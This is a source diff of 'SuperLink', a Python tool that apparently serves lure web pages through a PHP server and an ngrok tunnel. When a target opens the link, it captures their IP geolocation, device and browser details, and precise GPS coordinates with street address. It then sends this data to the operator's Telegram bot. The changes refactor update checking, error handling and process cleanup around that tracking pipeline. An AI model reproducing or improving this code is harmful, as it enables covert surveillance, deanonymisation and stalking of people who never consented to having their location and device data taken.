@@ -1,6 +1,6 @@
 from argparse import ArgumentParser
 from json import loads
-from os import getcwd, getlogin, listdir, name, stat, system
+from os import getcwd, listdir, name, stat, system
 from pathlib import Path
 from platform import uname
 from subprocess import Popen
@@ -24,8 +24,6 @@ from Modules.timeOptions import TimeOptions
 
 if name == "nt":
     from win10toast import ToastNotifier
-else:
-    pass
 
 LG = Fore.LIGHTGREEN_EX  # light green
 LR = Fore.LIGHTRED_EX  # light red
@@ -41,7 +39,7 @@ parser.add_argument("-p", "--port",
                     help="The port for PHP server & ngrok tunnel [ Default : 4545 ]")
 args = parser.parse_args()
 PORT = args.port
-script_version = "1.4.2"
+script_version = "1.4.3"
 script_title = f"SuperLink - v{script_version} - By IHosseini"
 
 
@@ -87,8 +85,6 @@ def neofetch():
 def tm_settitle(title: str):
     if name == "nt":
         system(f"title {title}")
-    else:
-        pass
 
 
 def tm_cleaner():
@@ -128,6 +124,8 @@ def current_working_dir():
         cwd = cwd.split("/")[-1]
     else:
         cwd = cwd.split("\\")[-1]
+    if cwd == "/":
+        cwd = ""
     return cwd
 
 
@@ -271,51 +269,56 @@ def check_updates():
     t_print = TmPrint()
     updater = CheckUpdates()
     up_downloader = GetNewUpdate()
-    banner()
-    print("\n\n")
-    t_print.out(LG + " [>] Checking for new update...")
-    if updater.check_for_updates is False:
-        t_print.out(LG + " [>] Everything is up-to-date!")
-        win10_notify("Up-To-Date!", "Everything has been checked and there is not any new update!",
-                     icon="./Modules/icons/green_check.ico")
-    elif updater.check_for_updates is None:
-        t_print.out(LY + " [!] Something went wrong!!!")
-        win10_notify("Something went wrong!",
-                     "Something unknown happened while checking for new update!\nplease check your network connection.",
-                     icon="./Modules/icons/red_cross.ico")
-    else:
-        t_print.out(LY + f" [!] There is a new update available! (" +
-                    LR + f"v{updater.check_for_updates}" + LY + ")")
-        win10_notify("New update available!",
-                     f"A new update released on github by the author\nnew version: {updater.check_for_updates}",
-                     icon="./Modules/icons/exclamation_mark.ico")
-        up_file = f"SuperLink-v{updater.check_for_updates}.zip"
-        select_down = input("\n\n" + LG + " [" + LR + "?" + LG + "]" +
-                            LB + f" Do you want to download the new version ({updater.check_for_updates}) ? [y/n] " +
-                            LW + "").lower()
-        if select_down == "y" or select_down == "yes":
-            banner()
-            print("\n\n")
-            t_print.out(
-                LG + f" [>] Downloading new version ({updater.check_for_updates}) ...")
-            try:
-                up_downloader.download(f"../{up_file}")
-                t_print.out(LG + f" [>] Downloaded successfully!")
-                win10_notify("Update files downloaded!",
-                             "New update files successfully downloaded and gonna be extracted soon!",
-                             icon="./Modules/icons/download_folder.ico")
-                t_print.out(
-                    LG + f" [>] Extracting new update file ({up_file})...")
-                sleep(2)
-                up_downloader.extract(
-                    f"../{up_file}", path=f"../{up_file}".replace(".zip", ""))
-                t_print.out(LG + f" [>] Update file successfully extracted in " +
-                            LW + f"[../{up_file}]".replace(".zip", ""))
-            except Exception as _:
-                t_print.out(LR + f" [>] Something went wrong while updating!")
-            press_enter()
+    try:
+        banner()
+        print("\n\n")
+        t_print.out(LG + " [>] Checking for new update...")
+        if updater.new_update is False:
+            t_print.out(LG + " [>] Everything is up-to-date!")
+            win10_notify("Up-To-Date!", "Everything has been checked and there is not any new update!",
+                         icon="./Modules/icons/green_check.ico")
+        elif updater.new_update is None:
+            t_print.out(LY + " [!] Something went wrong!!!")
+            win10_notify("Something went wrong!",
+                         "Something unknown happened while checking for new update!\n"
+                         "please check your network connection.",
+                         icon="./Modules/icons/red_cross.ico")
         else:
-            pass
+            t_print.out(LY + f" [!] There is a new update available! (" +
+                        LR + f"v{updater.new_update}" + LY + ")")
+            win10_notify("New update available!",
+                         f"A new update released on github by the author\nnew version: {updater.new_update}",
+                         icon="./Modules/icons/exclamation_mark.ico")
+            up_file = f"SuperLink-v{updater.new_update}.zip"
+            select_down = input("\n\n" + LG + " [" + LR + "?" + LG + "]" +
+                                LB + f" Do you want to download the new version ({updater.new_update}) ? [y/n] " +
+                                LW + "").lower()
+            if select_down == "y" or select_down == "yes":
+                banner()
+                print("\n\n")
+                t_print.out(
+                    LG + f" [>] Downloading new version ({updater.new_update}) ...")
+                try:
+                    up_downloader.download(f"../{up_file}")
+                    t_print.out(LG + f" [>] Downloaded successfully!")
+                    win10_notify("Update files downloaded!",
+                                 "New update files successfully downloaded and gonna be extracted soon!",
+                                 icon="./Modules/icons/download_folder.ico")
+                    t_print.out(
+                        LG + f" [>] Extracting new update file ({up_file})...")
+                    sleep(2)
+                    up_downloader.extract(
+                        f"../{up_file}", path=f"../{up_file}".replace(".zip", ""))
+                    t_print.out(LG + f" [>] Update file successfully extracted in " +
+                                LW + f"[../{up_file}]".replace(".zip", ""))
+                except Exception as _:
+                    t_print.out(
+                        LR + f" [>] Something went wrong while updating!")
+                press_enter()
+            else:
+                pass
+    except KeyboardInterrupt:
+        exit()
 
 
 class TmPrint:
@@ -399,30 +402,28 @@ class MainServer:
                       LW + " [" + LR + "Ctrl+C" + LW + "]" + LG + " ... \n")
                 self.get_user_data()
         except Exception as error:
-            if "The ngrok process errored on start" in str(error):
-                print("\n\n" + LY +
-                      " [!] Something went wrong while creating the link!\n")
-            else:
-                print("\n\n" + LR + " [#MainServer] ERROR : " + str(error))
-            self.tele_bot.sendMessage(f"❌ Link expired!\n\n🌐 Template name : {template_name}" +
+            print("\n\n" + LR + " [#MainServer] ERROR : " + str(error))
+            self.tele_bot.sendMessage(f"❌ Link expired! (Server error)\n\n🌐 Template name : {template_name}" +
                                       f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
-            press_enter()
-            self.kill_php()
-            ngrok.kill()
+            self.kill_php_ngrok()
         except KeyboardInterrupt:
-            self.tele_bot.sendMessage(f"❌ Link expired!\n\n🌐 Template name : {template_name}" +
+            self.tele_bot.sendMessage(f"❌ Link expired! (Closed server)\n\n🌐 Template name : {template_name}" +
                                       f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
-            self.kill_php()
+            self.kill_php_ngrok()
 
     @staticmethod
-    def kill_php():
+    def kill_php_ngrok():
+        press_enter()
         tm_cleaner()
-        if name != "nt":
-            pass
-        else:
+        if name == "nt":
             with open("./Logs/PHP-Log/TERMINATE_PHP_LOG.log", "w", encoding="UTF-8") as kill_process:
                 Popen(("taskkill", "/F", "/IM", "php*"),
                       stdout=kill_process, stderr=kill_process)
+        else:
+            with open("./Logs/PHP-Log/TERMINATE_PHP_LOG.log", "w", encoding="UTF-8") as kill_process:
+                Popen(("pkill", "php"), stdout=kill_process, stderr=kill_process)
+        ngrok.kill()
+        exit()
 
     @staticmethod
     def get_ip_addr():
@@ -469,10 +470,9 @@ class MainServer:
                         with open(file_path_info, "r", encoding="UTF-8") as info_file:
                             info_content = info_file.read()
                         info_data = loads(info_content)["info"]
-                        ip_data = GeolocationIP(target_ip)
-                        ip_data = ip_data.getData
-                        full_target_data = implement_userdata(
-                            info_data, ip_data)
+                        ip = GeolocationIP(target_ip)
+                        ip = ip.get_data
+                        full_target_data = implement_userdata(info_data, ip)
                         with open(target_data_file, "w", encoding="UTF-8") as target_info:
                             target_info.write(full_target_data)
                         t_print.out(LG + f" [>] Target GeoIP data successfully saved in" +
@@ -503,20 +503,23 @@ class MainServer:
                             altitude = loc_data["altitude"]
                             direction = loc_data["direction"]
                             speed = loc_data["speed"]
-                            address = self.geocoding.reverse(latitude, longitude)[
-                                "display_name"]
+                            address = self.geocoding.reverse(
+                                latitude, longitude)
                             with open(target_data_file, "a", encoding="UTF-8") as target_info:
                                 target_info.write("\n\n[------ Location Info ------] \n\n" +
                                                   f"-> Latitude : {latitude}\n-> Longitude : {longitude}\n" +
                                                   f"-> Altitude : {altitude}\n-> Speed : {speed}\n" +
                                                   f"-> Direction : {direction}\n-> Accuracy : {accuracy}\n" +
-                                                  f"-> Google Maps Link : google.com/maps/place/{latitude}+{longitude}\n" +
-                                                  f"-> Human-Readable Address: {address}")
-                            with open(file_path_loc, "w", encoding="UTF-8") as loc_file:
-                                loc_file.write("")
-                            t_print.out(LG + " [>] Target Location data successfully appended to " +
-                                        LW + f"[{target_data_file}]")
-                            print("")
+                                                  f"-> Google Maps Link : google.com/maps/place/{latitude}+{longitude}\n")
+                                if "message" not in address:
+                                    address = address["display_name"]
+                                    target_info.write(
+                                        f"-> Human-Readable Address: {address}")
+                                with open(file_path_loc, "w", encoding="UTF-8") as loc_file:
+                                    loc_file.write("")
+                                t_print.out(LG + " [>] Target Location data successfully appended to " +
+                                            LW + f"[{target_data_file}]")
+                                print("")
                         else:
                             t_print.out(LR + " [>]" +
                                         LY + " Target " + LW + "Location data" +
@@ -536,8 +539,8 @@ class MainServer:
                                                    (255, 255, 255))
                             self.tele_bot.sendDocument(target_data_file,
                                                        caption=f"*Target Number*: `{number_of_target}`\n" +
-                                                       f"*Template name*: `{template_name}`\n"
-                                                       f"*Time*: {self.time_opt.calendar} {self.time_opt.clock}",
+                                                               f"*Template name*: `{template_name}`\n"
+                                                               f"*Time*: {self.time_opt.calendar} {self.time_opt.clock}",
                                                        parse_mode="Markdown")
                         t_print.out(
                             LG + " [>] Data file successfully sent to your" + LW + " telegram" + LG + " !")
@@ -556,17 +559,17 @@ class MainServer:
                     continue
             except Exception as error:
                 print("\n\n" + LR + " [#getUserData] ERROR : " + str(error))
-                exit()
+                self.kill_php_ngrok()
             except KeyboardInterrupt:
                 exit()
 
 
-def implement_userdata(info_data: dict, ip_data: dict):
+def implement_userdata(info_data: dict, ip: dict):
     full_target_data = "[------ GeolocationIP Info ------] \n\n" \
-                       f"-> IP : {ip_data['ip']}\n-> City : {ip_data['city']}\n" \
-                       f"-> Region : {ip_data['region']}\n-> Country : {ip_data['country']}\n" \
-                       f"-> Location : {ip_data['location']}\n-> ISP : {ip_data['isp']}\n" \
-                       f"-> Post Code : {ip_data['postal']}\n-> Time Zone : {ip_data['time_zone']}\n" \
+                       f"-> IP : {ip['ip']}\n-> City : {ip['city']}\n" \
+                       f"-> Region : {ip['region']}\n-> Country : {ip['country']}\n" \
+                       f"-> Location : {ip['location']}\n-> ASN : {ip['asn']}\n" \
+                       f"-> Post Code : {ip['postal']}\n-> Time Zone : {ip['time_zone']}\n" \
                        "\n[------ System Info ------] \n\n" \
                        f"-> OS Name : {info_data['OS-Name']}\n-> OS Version : {info_data['OS-Version']}\n" \
                        f"-> Browser : {info_data['Browser-Name']} {info_data['Browser-Version']}\n" \
